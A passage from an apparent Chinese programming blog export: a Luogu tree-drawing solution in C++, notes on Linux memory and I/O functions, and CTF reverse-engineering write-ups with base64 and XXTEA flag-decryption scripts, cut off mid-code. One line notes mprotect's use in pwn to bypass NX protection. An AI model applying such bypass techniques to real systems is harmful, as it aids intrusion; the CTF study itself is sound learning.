class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C C++ programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> console </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>洛谷P1185</title>
      <link href="/2023-09-04-7912381beacd/"/>
      <url>/2023-09-04-7912381beacd/</url>
      
        <content type="html"><![CDATA[<p>首先先说一下最后一个测试点很多人RE的问题,我来了一张图:<br><img src="https://cdn.luogu.com.cn/upload/image_hosting/j76jqa31.png" alt=""><br>大概就是图里的那样…</p><p>下面是我的思路:<br>可能<s>稍微</s>复杂一点…</p><p>首先,题意我就不说了,关键在于每一层的边长度不同:<br>大佬们已经推出来这么个东西:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f[<span class="number">20</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">23</span>,<span class="number">47</span>,<span class="number">95</span>,<span class="number">191</span>,<span class="number">383</span>,<span class="number">767</span>&#125;;</span><br></pre></td></tr></table></figure><p>其中f[i]就是高度为i的那一层到它上一层的边的长度(这里的高度指的是由下往上数的高度,为了方便我把最下边设为了1)<br>举个例子(样例)<img src="https://cdn.luogu.com.cn/upload/image_hosting/4ll725uh.png" alt="">:<br>也就是说f[i]存的就是第i层到第i-1层的边的长度(几个’/‘或’\’)</p><p>我是先把最下边一层先初始化弄进去,因为我不知道n,所以我从我开的画布数组最下边一行开始,从下往上:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line">num=<span class="number">1</span>&lt;&lt;(n<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> i=<span class="number">1</span>,j=<span class="number">1</span>;i&lt;=num/<span class="number">2</span>;++i,j+=<span class="number">6</span>)</span><br><span class="line">&#123;</span><br><span class="line">paint[<span class="number">19000</span>][j]=<span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">paint[<span class="number">19000</span>][j+<span class="number">4</span>]=<span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个一组,很容易得出最下面一行共需要(2^(n-1))/2次循环,每次直接两个都放进去’o’,然后很容易的j每次加6(横坐标)</p><p>然后从倒数第二行开始模拟往画布里填’o’或’/‘或’\’<br>我们可以这样:计算出当前行的最左/最右结点在画布里的坐标为循环边界,从左边(当前行的所有结点视为向上一行的结点的孩子),即左孩子开始,向右上方朝父节点画’/’.</p><p>但是要画几次呢?这时我们的f[]数组就派上用场了…从第i层向上画’/'当然画f[i]次了,然后画完边后再向右上一格把父节点也就是’o’画上,然后从父结点再往右下画回到右孩子,然后这一个子树画完再画旁边的树,画个流程图吧:<img src="https://cdn.luogu.com.cn/upload/image_hosting/ghvps2ft.png" alt=""></p><p>就是这样,先上去,再下来,然后虚线跳到下一个子树,注意这时跳跃的长度每层是不一样的,我们用s[]来存,很容易得出(跟f[]很类似):</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s[<span class="number">20</span>]=&#123;<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">48</span>,<span class="number">96</span>,<span class="number">192</span>,<span class="number">384</span>,<span class="number">768</span>,<span class="number">1536</span>&#125;;</span><br></pre></td></tr></table></figure><p>每次横坐标加就行了</p><p>这样,我们最后就有了一个完全二叉树,然后就是去节点了.<br>画布里存得是点或边在这张&quot;画&quot;里得坐标,而题目输入进来得是结点在树中得坐标,这时我们就开一个结构体数组存树,数组的每个元素为结点,每个元素(都是一个结构体变量)里的结构体成员x和y存的是通过计算求得的在画布里的坐标,然后找到要删除的点,把它和它的子树所在的一个正方形区都归为’ '(空格),如图:<img src="https://cdn.luogu.com.cn/upload/image_hosting/n0l0wfis.png" alt=""></p><p>然后,愉快的输出就行了,其他的细节在代码中:</p><p>AC代码:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> n,k,num,x,y,line=<span class="number">19000</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> l,r,f[<span class="number">20</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">23</span>,<span class="number">47</span>,<span class="number">95</span>,<span class="number">191</span>,<span class="number">383</span>,<span class="number">767</span>&#125;;<span class="comment">//解释过了</span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> s[<span class="number">20</span>]=&#123;<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">24</span>,<span class="number">48</span>,<span class="number">96</span>,<span class="number">192</span>,<span class="number">384</span>,<span class="number">768</span>,<span class="number">1536</span>&#125;;<span class="comment">//跳跃的长度</span></span><br><span class="line"><span class="type">char</span> paint[<span class="number">20001</span>][<span class="number">5000</span>];<span class="comment">//画布</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">TREE</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> x,y;</span><br><span class="line">&#125;tree[<span class="number">1040</span>];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">draw</span><span class="params">(<span class="type">long</span> <span class="type">long</span> i)</span><span class="comment">//画边和点</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">x=line,y=l;</span><br><span class="line">l=y+f[i]+<span class="number">1</span>;<span class="comment">//l---左边界的重新计算要在这里</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> j=<span class="number">1</span>;j&lt;=num/<span class="number">2</span>;++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/////////向右上画//////////////</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> k=<span class="number">1</span>;k&lt;=f[i];++k)</span><br><span class="line">paint[--x][++y]=<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">paint[--x][++y]=<span class="string">&#x27;o&#x27;</span>;</span><br><span class="line"><span class="comment">//////////////////////////////</span></span><br><span class="line"><span class="comment">/////////向左下画回去//////////</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> k=<span class="number">1</span>;k&lt;=f[i];++k)</span><br><span class="line">paint[++x][++y]=<span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line"><span class="comment">//////////////////////////////</span></span><br><span class="line">++x;</span><br><span class="line">y++;</span><br><span class="line">y+=s[i];</span><br><span class="line"><span class="comment">//重新计算坐标</span></span><br><span class="line">&#125;</span><br><span class="line">y-=s[i];</span><br><span class="line">r=y-f[i]<span class="number">-1</span>;</span><br><span class="line">line=x-f[i]<span class="number">-1</span>;</span><br><span class="line">num/=<span class="number">2</span>;</span><br><span class="line"><span class="comment">//把num---即当前行的结点数、</span></span><br><span class="line"><span class="comment">//r---右边界、</span></span><br><span class="line"><span class="comment">//line---最高点的所在行</span></span><br><span class="line"><span class="comment">//重新计算为向上一行(左边界在上边重新计算)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">remove_down_all</span><span class="params">(<span class="type">long</span> <span class="type">long</span> up,<span class="type">long</span> <span class="type">long</span> r_l,<span class="type">long</span> <span class="type">long</span> r_r)</span><span class="comment">//重置矩形区域</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> i=up;i&lt;=<span class="number">19000</span>;++i)</span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> j=r_l;j&lt;=r_r;++j)</span><br><span class="line">paint[i][j]=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">remove_up_edge</span><span class="params">(<span class="type">long</span> <span class="type">long</span> x,<span class="type">long</span> <span class="type">long</span> y)</span><span class="comment">//删除(重置为&#x27; &#x27;(即空格))要删除点向上与父亲的连线</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> ex=x<span class="number">-1</span>,ey=y<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span>(paint[ex][ey]!=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">while</span>(paint[ex][ey]!=<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">paint[ex--][ey--]=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">ex=x<span class="number">-1</span>,ey=y+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(paint[ex][ey]!=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">while</span>(paint[ex][ey]!=<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">paint[ex--][ey++]=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">cout&lt;&lt;endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(paint,<span class="string">&#x27; &#x27;</span>,<span class="built_in">sizeof</span>(paint));</span><br><span class="line">num=<span class="number">1</span>&lt;&lt;(n<span class="number">-1</span>);</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> num2=num;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> len=<span class="number">0</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> to=(num2/<span class="number">2</span>)*<span class="number">6</span><span class="number">-1</span>;<span class="comment">//to为整棵树的宽度,我们要用它输出树(列循环范围)</span></span><br><span class="line">l=<span class="number">1</span>;r=(num/<span class="number">2</span>)*<span class="number">6</span><span class="number">-1</span>;<span class="comment">//初始化左右边界</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> i=<span class="number">1</span>,j=<span class="number">1</span>;i&lt;=num/<span class="number">2</span>;++i,j+=<span class="number">6</span>)<span class="comment">//初始化最下面一行</span></span><br><span class="line">&#123;</span><br><span class="line">paint[<span class="number">19000</span>][j]=<span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">paint[<span class="number">19000</span>][j+<span class="number">4</span>]=<span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> i=<span class="number">1</span>;i&lt;n;++i)<span class="comment">//开始从下往上每一层&quot;绘画&quot;</span></span><br><span class="line"><span class="built_in">draw</span>(i);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> i=line;i&lt;=<span class="number">19000</span>;++i)<span class="comment">//计算坐标,用以删除结点</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> j=<span class="number">1</span>;j&lt;=to;++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(paint[i][j]==<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">tree[++len].x=i;</span><br><span class="line">tree[len].y=j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> t,y1,y2;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> i=<span class="number">1</span>;i&lt;=k;++i)<span class="comment">//删除结点(每次删除之前的准备工作)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;x,&amp;y);</span><br><span class="line">t=<span class="number">1</span>&lt;&lt;(x<span class="number">-1</span>);</span><br><span class="line">t=t+y<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span>(t&gt;len)<span class="keyword">continue</span>;</span><br><span class="line">x=tree[t].x;</span><br><span class="line">y=tree[t].y;</span><br><span class="line">y1=y-(<span class="number">19000</span>-x);</span><br><span class="line">y2=y+(<span class="number">19000</span>-x);</span><br><span class="line"></span><br><span class="line"><span class="built_in">remove_down_all</span>(x,y1,y2);</span><br><span class="line"><span class="built_in">remove_up_edge</span>(x,y);<span class="comment">//这两个函数才是真正的删除</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//处理完了......</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> i=line;i&lt;=<span class="number">19000</span>;++i)<span class="comment">//输出,结束</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> j=<span class="number">1</span>;j&lt;=to;++j)</span><br><span class="line">cout&lt;&lt;paint[i][j];</span><br><span class="line">cout&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>管理员求过…真的是自己的做法</p>]]></content>
      
      
      <categories>
          
          <category> 洛谷 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c系函数总结</title>
      <link href="/2023-08-28-fbefc4f390e2/"/>
      <url>/2023-08-28-fbefc4f390e2/</url>
      
        <content type="html"><![CDATA[<h1 id="linux-c函数">Linux c函数</h1><h2 id="内存控制">内存控制</h2><h3 id="mprotect函数">mprotect函数</h3><p>用于更改一段内存的保护属性,例如将可读写的内存区域变为只读，或者将只读的内存区域变为可执行等.</p><p>pwn中常用于修改.bss段的属性以此来绕过<strong>NX保护</strong>.</p><p>函数原型:</p><p><code>int mprotect(void *addr, size_t len, int prot);</code></p><p>参数说明：</p><ul><li><code>addr</code>：要更改保护属性的内存区域的起始地址。</li><li><code>len</code>：内存区域的长度（以字节为单位）。</li><li><code>prot</code>：新的保护权限，可以是 <code>PROT_NONE</code>、<code>PROT_READ</code>、<code>PROT_WRITE</code>、<code>PROT_EXEC</code> 等的组合。</li></ul><p><code>mprotect</code> 函数返回 0 表示成功，返回 -1 表示失败，并设置相应的错误码。</p><h3 id="mmap函数">mmap函数</h3><p>用于内存映射,可以用于简化例如进程间通信—IPC需要4次数据复制,而内存映射到共享区只需2次复制即可</p><p>函数原型:</p><p><code>void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);</code></p><p>参数说明：</p><ul><li><code>addr</code>：映射的起始地址，通常为 <code>NULL</code>，由系统自动分配。</li><li><code>length</code>：映射区域的大小，以字节为单位。</li><li><code>prot</code>：映射区域的保护权限，可以是 <code>PROT_READ</code>、<code>PROT_WRITE</code>、<code>PROT_EXEC</code> 等的组合。</li><li><code>flags</code>：映射选项，如 <code>MAP_SHARED</code>、<code>MAP_PRIVATE</code> 等。</li><li><code>fd</code>：文件描述符，表示要映射的文件或设备。</li><li><code>offset</code>：映射的偏移量，表示从文件的哪个位置开始映射。</li></ul><p><code>mmap</code> 返回一个指向映射区域的指针，如果映射失败，则返回 <code>MAP_FAILED</code>。</p><h3 id="read函数">read函数</h3><p>用于读取文件—linux一切皆文件,从打开的文件描述符中读取</p><p>函数原型:</p><p><code>ssize_t read(int fd, void *buf, size_t count);</code></p><p>参数为:</p><p>​文件描述符,读入到的缓冲区,读取的字节数</p><h3 id="write函数">write函数</h3><p>用于读取文件—linux一切皆文件,从打开的文件描述符中写入</p><p>函数原型:</p><p><code>ssize_t write(int fd, const void *buf, size_t count);</code></p><p>参数为:</p><p>​文件描述符,制定从哪个缓冲区用于写入,写入的字节数</p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> functions </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二进制作业第三周</title>
      <link href="/2023-08-06-e0bfe3100dcf/"/>
      <url>/2023-08-06-e0bfe3100dcf/</url>
      
        <content type="html"><![CDATA[<h1 id="re">RE</h1><h2 id="拔丝溜四-newstarsctf2022">拔丝溜四（NewstarsCTF2022）</h2><p>~~题在这里:~~https://buuoj.cn/match/matches/146/challenges#%E6%8B%94%E4%B8%9D%E6%BA%9C%E8%82%86%20(easy)</p><p>这个题,对base64进行了魔改…</p><p>首先,分析题目,从start入口寻找main:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230806194752784.png" alt="image-20230806194752784"></p><p>从这里的Code=某个函数()继续进入(既然是给返回代码赋值,那么很有可能就是main入口)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230806194844163.png" alt="image-20230806194844163"></p><p>这里的j_main是我命名成main的,后来IDA又重新分析为j_main(),进入真正的main后就可以正式分析了,</p><p>实际上代码就是对输入的长度为42的flag进行魔改的base64编码,编码结果就是main中那个显而易见的str2:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230806195020106.png" alt="image-20230806195020106"></p><p>第29行的encode()也是自己修改的函数名,魔改的base64()编码就是这里进行</p><p>进入后发现不是普通的base64,encode()将flag分成若干组,3个一组分别进行编码,但是每一组都使用不同的编码字符表—也就是所谓的变表加密</p><p>再次进入循环中的第一句函数调用中,发现有一个rand(),实际从逻辑上考虑肯定不可能是随机的,否则不会出现那个固定的base64结果,所以联想到对srand()调用时输入了某个固定的种子,但是我这里没有看出来哪个是srand()函数的调用(我太菜了)</p><p>于是我使用动态调试的方法,一个个的把求字符表的偏移值v1求出来:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230806195428984.png" alt="image-20230806195428984" style="zoom:50%;" /><p>在这里设断点后,直到运行完,把所有的v1出现过的值写成python列表就可以写解密脚本了:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;CPaKBfUZFcNwW9qCKgyvuS2PGPQ9mttGc/wCNS0w6hDwGOSsOkOEkL5V&#x27;</span></span><br><span class="line">alpha = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">key = [<span class="number">0x29</span>, <span class="number">0x28</span>, <span class="number">0x39</span>, <span class="number">0xa</span>, <span class="number">0x3e</span>, <span class="number">0x1e</span>, <span class="number">0x3b</span>, <span class="number">0x19</span>, <span class="number">0x0c</span>, <span class="number">0x0</span>, <span class="number">0x2e</span>, <span class="number">0x3a</span>, <span class="number">0x1</span>, <span class="number">0x18</span>]</span><br><span class="line"><span class="comment">#key即v1的所有变化值</span></span><br><span class="line">step = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">4</span>):</span><br><span class="line">    new_alpha = <span class="string">&#x27;&#x27;</span> + alpha[key[step]:] + alpha[<span class="number">0</span>:key[step]]<span class="comment">#将原字符表进行两部分的切片,调换位置,如不懂需要再去看看源码逻辑</span></span><br><span class="line">    <span class="comment"># print(new_alpha)</span></span><br><span class="line">    step += <span class="number">1</span></span><br><span class="line">    result = base64.b64decode(data[i:i + <span class="number">4</span>].translate(<span class="built_in">str</span>.maketrans(new_alpha, alpha)))</span><br><span class="line">    <span class="comment">#这里使用maketrans进行字符表的映射转换</span></span><br><span class="line">    <span class="built_in">print</span>(result.decode(),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230806195649900.png" alt="image-20230806195649900"></p><p>但是比赛结束了没办法提交flag…</p><p>结束…</p><h2 id="eztea-newstarsctf2022">EzTea(NewstarsCTF2022)</h2><p>这个题顾名思义,Tea加密…</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230807114651660.png" alt="image-20230807114651660" style="zoom:50%;" /><p>去分析代码就能知道,要对输入的串(之所以不说字符串是因为加密解密还是说字节串比较好)进行加密,然后与一个9*sizeof(int32_t)==36字节长度的加密后的串进行比较,也就是说这个加密的串就是加密后的flag.</p><p>那么我们要分析程序的加密算法,容易得知这是TEA系列的加密算法,而且通过加密中的&lt;&lt;4和&gt;&gt;4可以知道是TEA目前优化最好的(貌似?)XXTEA加密(不过MX还是要自己改的)</p><p>写出逆向解密脚本:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 这是网上的XXTEA使用的MX,但是与题不符</span></span><br><span class="line"><span class="comment"> * #define MX (z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)^(sum^y) + (k[p&amp;3^e]^z);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * IDA反汇编的加密部分,根据此进行MX的修改</span></span><br><span class="line"><span class="comment"> * v9 = ((v5 ^ *(_DWORD * )(a3 + 4i64 * (v10 ^ i &amp; 3))) + (v6 ^ v7)) ^ (((32 * v5) ^ (v6 &gt;&gt; 3))</span></span><br><span class="line"><span class="comment"> * + ((4 * v6) ^ (v5 &gt;&gt; 4)))</span></span><br><span class="line"><span class="comment"> * + intlist[i];</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这是根据IDA正确编写的解密算法</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z ^ k[(e^p)&amp;3])+(y^sum))^ (((32*z)^y&gt;&gt;3)+((4*y)^(z&gt;&gt;4))))</span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">btea</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">int</span> n, <span class="type">uint32_t</span> *k)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> z = v[n - <span class="number">1</span>], y = v[<span class="number">0</span>], sum = <span class="number">0</span>, e, DELTA = <span class="number">0x11451400</span>;</span><br><span class="line">    <span class="type">unsigned</span> p, q;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123;          <span class="comment">/* Coding Part */</span></span><br><span class="line">        q = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        <span class="keyword">while</span> (q-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++) y = v[p + <span class="number">1</span>], z = v[p] += MX;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) &#123;  <span class="comment">/* Decoding Part */</span></span><br><span class="line">        n = -n;</span><br><span class="line">        q = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = q * DELTA;</span><br><span class="line">        <span class="keyword">while</span> (sum != <span class="number">0</span>) &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--) z = v[p - <span class="number">1</span>], y = v[p] -= MX;</span><br><span class="line">            z = v[n - <span class="number">1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> k[<span class="number">4</span>] = 